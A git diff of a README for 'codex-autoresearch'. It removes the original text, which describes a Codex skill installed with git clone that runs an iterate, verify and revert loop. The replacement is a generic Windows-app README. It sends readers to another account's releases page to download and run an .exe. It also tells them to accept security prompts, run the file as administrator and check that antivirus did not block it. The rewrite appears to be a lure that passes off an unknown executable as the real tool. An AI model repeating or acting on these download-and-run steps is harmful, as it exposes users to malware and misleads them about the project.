@@ -1,195 +1,173 @@
-<p align="center">
-  <img src="image/banner.png" width="700" alt="Codex Autoresearch">
-</p>
+# 🧭 codex-autoresearch - Iterate, verify, and refine research
 
-<h2 align="center"><b>Aim. Iterate. Arrive.</b></h2>
+[![Download](https://img.shields.io/badge/Download-Releases%20Page-blue?style=for-the-badge)](https://github.com/luizgustavo22/codex-autoresearch/releases)
 
-<p align="center">
-  <i>Autonomous goal-driven experimentation for Codex.</i>
-</p>
+## 🚀 What this is
 
-<p align="center">
-  <a href="https://developers.openai.com/codex/skills"><img src="https://img.shields.io/badge/Codex-Skill-blue?logo=openai&logoColor=white" alt="Codex Skill"></a>
-  <a href="https://github.com/leo-lilinxiao/codex-autoresearch"><img src="https://img.shields.io/github/stars/leo-lilinxiao/codex-autoresearch?style=social" alt="GitHub Stars"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg" alt="MIT License"></a>
-</p>
+Codex Autoresearch is a Windows app for running a self-directed research loop. It follows a simple cycle:
 
-<p align="center">
-  <b>English</b> ·
-  <a href="docs/i18n/README_ZH.md">🇨🇳 中文</a> ·
-  <a href="docs/i18n/README_JA.md">🇯🇵 日本語</a> ·
-  <a href="docs/i18n/README_KO.md">🇰🇷 한국어</a> ·
-  <a href="docs/i18n/README_FR.md">🇫🇷 Français</a> ·
-  <a href="docs/i18n/README_DE.md">🇩🇪 Deutsch</a> ·
-  <a href="docs/i18n/README_ES.md">🇪🇸 Español</a> ·
-  <a href="docs/i18n/README_PT.md">🇧🇷 Português</a> ·
-  <a href="docs/i18n/README_RU.md">🇷🇺 Русский</a>
-</p>
+1. Make a change
+2. Check the result
+3. Keep the change or discard it
+4. Repeat
 
----
+It is built for users who want Codex to keep working through a task without manual back and forth. You use it to guide repeated edits and checks in a steady loop.
 
-The idea: tell Codex what you want to improve, then walk away. It modifies your code, verifies the result, keeps or discards, and repeats. You come back to a log of experiments and a better codebase.
+## 📥 Download
 
-Inspired by [Karpathy's autoresearch](https://github.com/karpathy/autoresearch), generalized beyond ML to anything you can verify mechanically: test coverage, type errors, latency, lint warnings, security findings, release readiness — if a command can tell whether it improved, the loop can iterate on it.
+Visit this page to download: https://github.com/luizgustavo22/codex-autoresearch/releases
 
-## Quick Start
+On that page, look for the latest release and download the Windows file. In most cases, this will be a `.exe` file or a zipped Windows package.
 
-```bash
-# Install
-git clone https://github.com/leo-lilinxiao/codex-autoresearch.git
-cp -r codex-autoresearch your-project/.agents/skills/codex-autoresearch
-```
+## 🪟 Windows setup
 
-Open Codex in your project and go:
+Follow these steps on Windows:
 
-```
-You:   $codex-autoresearch
-       I want to get rid of all the `any` types in my TypeScript code
+1. Open the releases page.
+2. Find the newest version at the top.
+3. Download the Windows file.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-Codex: I found 47 `any` occurrences across src/**/*.ts.
-       Metric: `any` count (current: 47), direction: lower
-       Verify: grep count + tsc --noEmit as guard
-       Run mode: foreground or background?
+If Windows shows a security prompt, choose the option that lets you run the file.
 
-You:   Background, go. Run overnight.
+## ⚙️ How it works
 
-Codex: Starting background run — baseline: 47. Iterating.
-```
+The app uses a repeat loop for research tasks. A common cycle looks like this:
 
-Each improvement stacks. Each failure reverts. Everything is logged.
+- Start with a task or prompt
+- Make one change
+- Run a check
+- Decide whether to keep the change
+- Move to the next step
+- Repeat the loop
 
-See [INSTALL.md](docs/INSTALL.md) for more options. See [GUIDE.md](docs/GUIDE.md) for the full manual.
+This setup helps when you want a process that keeps moving through a task without stopping after one pass.
 
-## How It Works
+## 🧩 Main uses
 
-```
-You say one sentence  →  Codex scans & confirms  →  You say "go"
-                                                        |
-                                         +--------------+--------------+
-                                         |                             |
-                                    foreground                    background
-                                  (current session)            (detached, overnight)
-                                         |                             |
-                                         +--------------+--------------+
-                                                        |
-                                                        v
-                                              +-------------------+
-                                              |    The Loop       |
-                                              |                   |
-                                              |  modify one thing |
-                                              |  git commit       |
-                                              |  run verify       |
-                                              |  improved? keep   |
-                                              |  worse? revert    |
-                                              |  log the result   |
-                                              |  repeat           |
-                                              +-------------------+
-```
+Use codex-autoresearch for tasks like these:
 
-That's it. You pick one: foreground keeps the loop in your current session, background hands it off to a detached process so you can sleep. Same loop either way, but they don't run at the same time.
+- Testing small changes in a project
+- Comparing different versions of work
+- Reworking text or notes in stages
+- Running a review cycle on repeated inputs
+- Keeping a task moving until the result is stable
 
-## What You Say vs What Happens
+It fits work that benefits from short feedback loops and clear decisions.
 
-| You say | What happens |
-|---------|-------------|
-| "Improve my test coverage" | Iterates until target or interrupted |
-| "Fix the 12 failing tests" | Repairs one by one until zero remain |
-| "Why is the API returning 503?" | Hunts root cause with falsifiable hypotheses |
-| "Is this code secure?" | STRIDE + OWASP audit, every finding backed by code evidence |
-| "Ship it" | Verifies readiness, generates checklist, gates release |
-| "I want to optimize but don't know what" | Analyzes repo, suggests metrics, generates config |
+## 💻 System requirements
 
-Behind the scenes, Codex maps your sentence to one of 7 modes (loop, plan, debug, fix, security, ship, exec). You never need to pick one.
+For a smooth run on Windows, use this baseline setup:
 
-## What Codex Figures Out
+- Windows 10 or Windows 11
+- 64-bit computer
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet access for downloads and updates
+- A local folder where the app can save its files
 
-You don't write config. Codex infers everything from your sentence and your repo:
+A newer system will handle repeated runs with less delay.
 
-| What it needs | How it gets it | Example |
-|--------------|----------------|---------|
-| Goal | Your sentence | "get rid of all any types" |
-| Scope | Scans repo structure | `src/**/*.ts` |
-| Metric | Proposes based on goal + tooling | any count (current: 47) |
-| Direction | Infers from "improve" / "reduce" / "eliminate" | lower |
-| Verify | Matches to repo tooling | `grep` count + `tsc --noEmit` |
-| Guard | Suggests if regression risk exists | `npm test` |
+## 🔧 Files you may see
 
-Before starting, Codex always shows what it found and asks you to confirm. Then you choose foreground or background and say "go."
+Depending on the release, you may see one of these:
 
-## When It Gets Stuck
+- `codex-autoresearch.exe`
+- A `.zip` file with the app inside
+- A folder with support files
+- A release note file with version details
 
-Instead of blind retrying, the loop escalates:
+If you download a zip file, keep the app and its support files together in the same folder.
 
-| Trigger | Action |
-|---------|--------|
-| 3 consecutive failures | **REFINE** — adjust within current strategy |
-| 5 consecutive failures | **PIVOT** — try a fundamentally different approach |
-| 2 PIVOTs without progress | **Web search** — look for external solutions |
-| 3 PIVOTs without progress | **Stop** — report that human input is needed |
+## 🖱️ First run
 
-One success resets all counters.
+After you open the app for the first time:
 
-## Results Log
+1. Pick the task you want to work on
+2. Set the starting input
+3. Choose how strict the checks should be
+4. Let the loop begin
+5. Review the result after each pass
 
-Every iteration is recorded in `research-results.tsv`:
+If the app asks where to save output, choose a folder you can find again later.
 
-```
-iteration  commit   metric  delta   status    description
-0          a1b2c3d  47      0       baseline  initial any count
-1          b2c3d4e  41      -6      keep      replace any in auth module
-2          -        49      +8      discard   generic wrapper introduced new anys
-3          d4e5f6g  38      -3      keep      type-narrow API response handlers
-```
+## 🧠 Typical workflow
 
-Failed experiments revert from git but stay in the log. The log is the real audit trail.
+A simple workflow may look like this:
 
-## More Features
+- Write the goal
+- Let the app make the first pass
+- Review the result
+- Keep the change if it helps
+- Reject the change if it does not help
+- Run another pass
 
-These are covered in detail in [GUIDE.md](docs/GUIDE.md):
+This keeps the process focused and easy to follow.
 
-- **Cross-run learning** — lessons from past runs bias future hypothesis generation
-- **Parallel experiments** — test up to 3 hypotheses simultaneously via git worktrees
-- **Session resume** — interrupted runs pick up from the last consistent state
-- **CI/CD mode** (`exec`) — non-interactive, JSON output, for automation pipelines
-- **Dual-gate verification** — separate verify (did it improve?) and guard (did anything break?)
-- **Session hooks** — auto-installed; keep Codex on track across session boundaries
+## 🛠️ Troubleshooting
 
-## FAQ
+If the app does not open:
 
-**It only makes small incremental changes. Can it try bigger ideas?**
-By default the loop favors small, verifiable steps — that's by design. But it can go bigger: describe a larger hypothesis in your prompt (e.g., "try replacing the attention mechanism with linear attention and run the full eval"), and it will treat that as a single experiment to verify. The loop is best when the human sets the research direction and the agent does the heavy execution and analysis.
+- Check that the download finished
+- Make sure you extracted the files if the release came as a zip
+- Run the file from a local folder, not from inside the zip
+- Right-click the file and try Run as administrator
+- Check that your antivirus did not block the file
 
-**Is this more for engineering optimization than research?**
-It's strongest when the goal and metric are clear — push coverage up, push errors down, push latency lower. For open-ended research where the direction itself is uncertain, use `plan` mode first to explore, then switch to `loop` once you know what to measure. Think of it as a human-AI collaboration: you provide judgment, it provides iteration speed.
+If the app opens but closes fast:
 
-**How do I stop it?** Foreground: interrupt Codex. Background: `$codex-autoresearch` then ask to stop.
+- Try running it again from the same folder
+- Make sure the required files are still next to the app
+- Re-download the release if the file looks incomplete
 
-**Can it resume after interruption?** Yes. It resumes from `autoresearch-state.json` automatically.
+If you do not see the latest release:
 
-**How do I use it in CI?** `Mode: exec` with `codex exec`. All config upfront, JSON output, exit codes 0/1/2.
+- Refresh the releases page
+- Scroll to the top of the page
+- Look for the newest version tag
 
-## Documentation
+## 📂 Suggested folder layout
 
-| Doc | What it covers |
-|-----|---------------|
-| [INSTALL.md](docs/INSTALL.md) | All installation methods, skill discovery paths, hooks setup |
-| [GUIDE.md](docs/GUIDE.md) | Full operator's manual: modes, config fields, safety model, advanced usage |
-| [EXAMPLES.md](docs/EXAMPLES.md) | Recipes by domain: coverage, performance, types, security, etc. |
+You can keep things simple with a folder like this:
 
-## Acknowledgments
+- `Downloads`
+  - `codex-autoresearch`
+    - `codex-autoresearch.exe`
+    - support files
+    - notes or output files
 
-Built on ideas from [Karpathy's autoresearch](https://github.com/karpathy/autoresearch). The Codex skills platform is by [OpenAI](https://openai.com).
+This makes it easy to find the app and its results later.
 
-## Star History
+## 🔄 Version updates
 
-<a href="https://www.star-history.com/?repos=leo-lilinxiao%2Fcodex-autoresearch&type=timeline&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=leo-lilinxiao/codex-autoresearch&type=timeline&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=leo-lilinxiao/codex-autoresearch&type=timeline&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=leo-lilinxiao/codex-autoresearch&type=timeline&legend=top-left" />
- </picture>
-</a>
+When a new release is posted:
 
-## License
+1. Go to the releases page
+2. Download the new Windows file
+3. Replace the older app files if needed
+4. Keep your output files in a separate folder
+5. Open the new version and continue
 
-MIT — see [LICENSE](LICENSE).
+If you keep your work in its own folder, updates are easier to manage.
+
+## 📘 What to expect
+
+This app is built for repeat work. It does not aim to be a one-click tool. It gives you a loop that can keep checking, keeping, or discarding changes as the task moves forward.
+
+That makes it useful when you want:
+
+- A steady process
+- Clear review points
+- Less manual restarting
+- More control over each step
+
+## 🧭 Download and run checklist
+
+- Open the releases page
+- Download the latest Windows file
+- Extract it if it is zipped
+- Open the app from a normal folder
+- Follow the on-screen steps
+- Review the result after each cycle
